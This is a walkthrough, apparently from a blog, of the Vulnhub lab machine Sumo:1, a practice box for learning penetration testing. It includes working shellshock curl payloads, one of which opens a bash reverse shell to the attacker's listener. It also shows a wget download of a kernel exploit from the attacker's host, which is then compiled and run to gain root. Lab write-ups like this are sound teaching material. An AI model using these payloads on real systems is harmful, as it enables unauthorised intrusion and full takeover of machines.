Today we will be doing Sumo:1 from Vulnhub. This machine is rated easy and good for beginners. This includes exploiting a shellshock vulnerability to get a reverse shell and then exploiting the old version kernel used by the VM to get root. I've add the IP to my hosts file, So Lets Begin!

```r
root@kali:~# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
192.168.1.16    sumo.local
```

## Inital Enumeration and User Shell

I started the reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.

```r
root@kali:~# nmap -sC -sV -oA nmap/sumo sumo.local

Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 13:06 IST

We have a port 80 open which displays a default web server page says that "It Works!"

Next I ran a gobuster scan to look for hidden directories, but didn't find anything interesting there. Then I performed a nikto scan to search for some web based vulnerabilities and found that this web server is vulnerable to <b>shellshock vulnerability.</b> </p>

```r
root@kali:~# nikto -h sumo.local

```
If you don't know about shellshock vulnerability, I recommend reading about it <a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)">here.</a> I tested the vulnerability by running <b>id</b> command.
```r
root@kali:~# curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://sumo.local/cgi-bin/test/test.cgi  

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Excellent, We were able to exploit this vulnerability. Now I executed a payload to open a reverse shell.

```r
root@kali:~# curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.6/9001 0>&1' http://sumo.local/cgi-bin/test/test.cgi  
```
I opened a netcat listner on the other terminal and we got the reverse shell.

```r
root@kali:~# nc -lvnp 9001
listening on [any] 9001 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.16] 60230
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Root Shell
<p align="justify">
Getting root on this machine was quite easy and straight forward. This machine is a using an old version of kernel. There are many exploits available to escalate the privileges. One of the most famous is Dirty Cow but I won't be using it here.
</p>

```r
www-data@ubuntu:/usr/lib/cgi-bin$ uname -a
uname -a
Linux ubuntu 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```

Instead I used <a href="https://www.exploit-db.com/exploits/33589"> this exploit</a> from exploitdb. I downloaded this exploit on my host machine and started a python http server and tranferred it to the target machine in the tmp directory.

```r
www-data@ubuntu:/usr/lib/cgi-bin$ cd /tmp
cd /tmp

www-data@ubuntu:/tmp$ wget http://192.168.1.6:8000/33589.c
wget http://192.168.1.6:8000/33589.c     
--2020-06-16 03:50:50--  http://192.168.1.6:8000/33589.c

     0K ...         100%  242M=0s
2020-06-16 03:50:50 (242 MB/s) - `33589.c' saved [3664/3664]
```
Then I tried to complite the exploit but it gave an error. This error can be fixed by updating the path variables using the following command:

```r
www-data@ubuntu:/tmp$ PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH   
```

This time the exploit complied without any errors, I gave the exploit executable permissions and after running the exploit, we were root!  

```r
www-data@ubuntu:/tmp$ gcc 33589.c -O2 -o exploit
gcc 33589.c -O2 -o exploit

www-data@ubuntu:/tmp$ chmod 777 exploit && ./exploit 0
chmod 777 exploit && ./exploit 0

stdin: is not a tty
id
uid=0(root) gid=0(root) groups=0(root)
python -c 'import pty;pty.spawn("/bin/bash")'

root@ubuntu:/tmp# cat /root/root.txt
cat /root/root.txt
{Sum0-SunCSR-2020_r001}
```
